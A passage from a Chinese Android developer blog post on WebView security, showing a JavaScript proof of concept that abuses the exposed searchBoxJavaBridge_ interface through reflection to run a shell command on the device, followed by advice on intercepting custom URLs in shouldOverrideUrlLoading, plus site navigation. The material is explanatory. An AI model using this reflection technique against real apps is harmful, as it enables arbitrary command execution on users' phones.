class="line"><span class="comment">//通过反射加载一个Runtime类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">cmdArgs</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> searchBoxJavaBridge_.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	execute([<span class="string">"/system/bin/sh"</span>,<span class="string">"-c"</span>,</span><br><span class="line">	<span class="string">"ls /mnt/scdcard &gt; /sdcard/log-netstat.txt"</span>]);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">	alert(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="九、WebView自定义拦截"><a href="#九、WebView自定义拦截" class="headerlink" title="九、WebView自定义拦截"></a>九、WebView自定义拦截</h3><p>虽然有些浏览器厂商已经解决了远程注入的问题，但是作为开发人员也因该减少与js的调用，并且设置一定的规则。<br>通常情况下需要定义协议，让js来打开本地客户端<br>例如要通过js启动一个新的activity<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"http://192.168.1.102:8080/webs/error.html?startActivity"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后在ManiActivity中进行拦截</p>
<pre><code class="Java">webView.setWebViewClient(<span class="keyword">new</span> WebViewClent(){
    <span class="meta">@Override</span>
    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view,String url)</span></span>{

        <span class="comment">//根据协议来启动新的activity</span>
        <span class="keyword">if</span>(url.endWith(<span class="string">"?startActivity"</span>)){
            Intent intent=<span class="keyword">new</span> Intent(ManiActivity.<span class="keyword">this</span>,SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;
            startActivity(intent);
            <span class="keyword">return</span> <span class="keyword">true</span>;
        }
        view.loadUrl(url);
        <span class="keyword">return</span> <span class="keyword">super</span>.shouldOverrideUrlLoading(view , url);
    }



});

</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/24/android-webview/" data-id="ck6rcrygj002y22o1r525c930" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/01/24/android-menu/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Android之menu的使用
        
      </div>
    </a>
  
  
    <a href="/2018/01/24/android-litepal/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Android数据持久化---LitePal</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GIS/">GIS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Gradle/">Gradle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Markdown/">Markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/React/">React</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpringBoot/">SpringBoot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WebAssembly/">WebAssembly</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/npm/">npm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sublime/">sublime</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tomcat/">tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webgl/">webgl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webpack/">webpack</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/GIS/" style="font-size: 11.67px;">GIS</a> <a href="/tags/Gradle/" style="font-size: 10px;">Gradle</a> <a href="/tags/JavaScript/" style="font-size: 16.67px;">JavaScript</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/React/" style="font-size: 18.33px;">React</a> <a href="/tags/SpringBoot/" style="font-size: 11.67px;">SpringBoot</a> <a href="/tags/WebAssembly/" style="font-size: 10px;">WebAssembly</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/java/" style="font-size: 13.33px;">java</a> <a href="/tags/linux/" style="font-size: 11.67px;">linux</a> <a href="/tags/npm/" style="font-size: 10px;">npm</a> <a href="/tags/sublime/" style="font-size: 10px;">sublime</a> <a href="/tags/tomcat/" style="font-size: 11.67px;">tomcat</a> <a href="/tags/webgl/" style="font-size: 15px;">webgl</a> <a href="/tags/webpack/" style="font-size: 10px;">webpack</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/01/09/js中的EventLoop/">js中的EventLoop</a>
          </li>
        
          <li>
            <a href="/2020/01/07/WebAssembly初体验/">WebAssembly初体验</a>
          </li>
        
          <li>
            <a href="/2019/12/24/webgl2基础/">webgl2基础</a>
          </li>
        
          <li>
            <a href="/2019/12/24/low-graphics-mode解决方法/">low-graphics mode解决方法</a>
          </li>
        
          <li>
            <a href="/2019/12/24/Ubuntu固定ip和软件愿/">Ubuntu固定ip和软件愿</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 杨亚辉<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>